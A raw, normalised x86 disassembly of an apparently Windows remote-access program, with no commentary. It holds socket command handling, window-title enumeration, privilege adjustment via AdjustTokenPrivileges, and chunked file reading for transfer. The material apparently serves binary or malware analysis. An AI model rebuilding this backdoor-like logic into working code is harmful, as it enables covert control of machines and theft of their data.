mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40bc9b
add esp 0x20
lea ecx [ ebp - 0x24 ]
jmp r-xdata
sub esp 0x10
mov esi rw-data
mov edi esp
lea eax [ ebp - 0x88 ]
push r--data
push esi
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x88 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea ecx [ ebp - 0x68 ]
mov eax esp
push r--data
push ecx
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push 0x1
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40bc9b
add esp 0x20
jmp r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_40ed0c
pop ecx
lea eax [ ebp - 0x20 ]
pop ecx
push eax
mov ecx rw-data
call sub_40ce9d
push 0x4
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_40ee4b
pop ecx
pop ecx
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_40ee4b
pop ecx
pop ecx
lea ecx [ ebp - 0x48 ]
call sub_402c45
lea ecx [ ebp - 0x48 ]
call sub_40ff13
jmp r-xdata
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_403474
pop ecx
pop ecx
sub_40c63f
push ebp
mov ebp esp
sub esp 0x48c
push ebx
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48c ]
call sub_402903
push r--data
push rw-data
mov [ ebp - 0xc ] 0x1388
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x30 ]
push eax
xor ebx ebx
xor edi edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x8 ] ebx
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x48c ]
call sub_402906
push edi
call [ free@IAT ]
test esi esi
pop ecx
jg r-xdata
lea eax [ ebp - 0xd ]
lea ecx [ ebp - 0x80 ]
push eax
push esi
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
add ebx esi
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x34 ] ebx
jne r-xdata
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
lea eax [ ebp - 0x60 ]
push 0xa
add ebx 0xfffffff1
push eax
push ebx
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x60 ]
push [ ebp + 0x8 ]
sub esp 0x10
mov ebx esp
push eax
push rw-data
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
call sub_402504
add esp 0x14
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx [ ebp - 0x34 ]
lea eax [ ebx - 0xf ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x20 ]
push [ eax ]
lea eax [ ebp - 0x44 ]
push 0xf
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
push [ ebp - 0xc ]
push edi
call [ realloc@IAT ]
pop ecx
mov edi eax
pop ecx
push 0x0
push [ ebp - 0xc ]
push edi
push [ ebp + 0x8 ]
call recv
mov esi eax
test esi esi
jle r-xdata
lea eax [ ebp - 0xc ]
lea ecx [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4024b4
add esp 0xc
test al al
je r-xdata
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x48c ]
call sub_402a2a
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x48c ]
call sub_402a2a
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
and [ ebp - 0x1 ] 0x0
jmp r-xdata
sub_40c8f3
push ebp
mov ebp esp
sub esp 0x2b4
lea eax [ ebp - 0x2b4 ]
push 0x12c
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextW@IAT ]
push [ ebp + 0x8 ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
leave
retn 0x8
cmp [ ebp - 0x2b4 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_40edd3
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_40c9dd
push ebp
mov ebp esp
sub esp 0x10
push esi
push 0x0
push sub_40c8f3
call [ EnumWindows@IAT ]
sub esp 0x10
lea eax [ ebp - 0x10 ]
mov esi esp
push rw-data
push rw-data
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
pop esi
leave
retn
sub_40ca41
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
lea eax [ ebp - 0x10 ]
xor esi esi
push eax
push r--data
push esi
call [ LookupPrivilegeValueA@IAT ]
push esi
push esi
lea eax [ ebp - 0x14 ]
push esi
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
pop esi
neg eax
leave
retn
sub_40ca9b
push ebp
mov ebp esp
sub esp 0x1fc
push ebx
push esi
push edi
push 0x1
lea ecx [ ebp - 0x16c ]
call sub_4020e1
mov ebx 0xfde8
push 0x1
push 0x24
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x24 ] ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x1fc ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x1fc ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov edi esp
mov esi rw-data
push eax
lea eax [ ebp + 0x38 ]
push esi
push eax
push esi
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x5c ]
lea ecx [ ebp - 0x1fc ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
mov ecx eax
call sub_405288
sub esp 0x10
mov esi rw-data
mov edi esp
lea ecx [ ebp - 0x16c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cdq
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
movsd [ edi ] [ esi ]
call sub_402168
xor esi esi
mov [ ebp - 0x18 ] 0x1
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_40fd20
mov edi eax
mov [ ebp - 0x4 ] esi
inc edi
cmp [ ebp - 0x1c ] esi
jb r-xdata
lea ecx [ ebp - 0x1fc ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0x16c ]
call sub_4021c7
mov bl 0x1
jmp r-xdata
ja r-xdata
lea ecx [ ebp - 0x1fc ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x16c ]
call sub_4021d6
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
leave
retn
mov esi rw-data
cmp [ ebp - 0x20 ] esi
jbe r-xdata
push ebx
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
push 0x0
lea ecx [ ebp - 0x1fc ]
push [ ebp - 0x4 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
push ebx
lea ecx [ ebp - 0x1fc ]
push [ ebp - 0x10 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea eax [ ebp - 0x11 ]
lea ecx [ ebp - 0x54 ]
push eax
push ebx
push [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov ebx esp
push eax
lea eax [ ebp + 0x38 ]
push esi
push eax
push esi
lea eax [ ebp - 0x44 ]
push edi
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
push esi
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
lea eax [ ebp + 0x28 ]
push esi
push eax
lea eax [ ebp + 0x18 ]
push esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
push esi
lea eax [ ebp - 0xac ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x8c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x7c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xdc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x12c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xbc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x6c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x11c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xec ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xcc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x9c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x16c ]
call sub_402198
cmp eax 0xffffffff
lea ecx [ ebp - 0x9c ]
sete bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x11c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xbc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x12c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xdc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
jne r-xdata
ja r-xdata
lea ecx [ ebp - 0x16c ]
call sub_4021c7
lea ecx [ ebp - 0x1fc ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
jmp r-xdata
push [ ebp - 0x10 ]
call sub_40fc2c
mov ebx [ ebp - 0x24 ]
pop ecx
sub [ ebp - 0xc ] ebx
sbb [ ebp - 0x8 ] 0x0
add [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x18 ]
cdq
cmp edx [ ebp - 0x1c ]
jb r-xdata
mov ebx [ ebp - 0xc ]
mov [ ebp - 0x24 ] ebx
cmp ebx [ ebp - 0xc ]
jbe r-xdata
xor bl bl
xor eax eax
cmp eax [ ebp - 0x8 ]
jb r-xdata
ja r-xdata
cmp eax [ ebp - 0x20 ]
jb r-xdata
sub_40ceb8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_408633
mov ecx [ ebp + 0x8 ]
push 0xc
sub ecx eax
mov eax ecx
pop ecx
cdq
idiv ecx
push [ ebp + 0xc ]
mov ecx edi
push 0x1
push [ ebp + 0x8 ]
mov esi eax
call sub_40cef5
mov ecx edi
call sub_408633
lea ecx [ esi + esi * 2 ]
pop edi
pop esi
lea eax [ eax + ecx * 4 ]
pop ebp
retn 0x8
sub_40cef5
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push 0xc
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0xc ]
sub eax ecx
pop edi
cdq
idiv edi
mov edi [ ebp + 0xc ]
cmp eax edi
jae r-xdata
mov eax ecx
push 0xc
sub eax [ ebp + 0x8 ]
pop ebx
cdq
idiv ebx
cmp eax edi
jae r-xdata
mov ecx esi
call sub_403556
cmp edi eax
jae r-xdata
test edi edi
jbe r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + edi * 2 ]
shl ebx 0x2
lea edx [ ebx + eax ]
push edx
push ecx
push eax
mov ecx esi
call sub_40d061
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
push 0xc
cdq
pop ecx
idiv ecx
mov ecx esi
sub edi eax
push edi
push [ esi + 0x8 ]
call sub_40d08d
push [ ebp + 0x10 ]
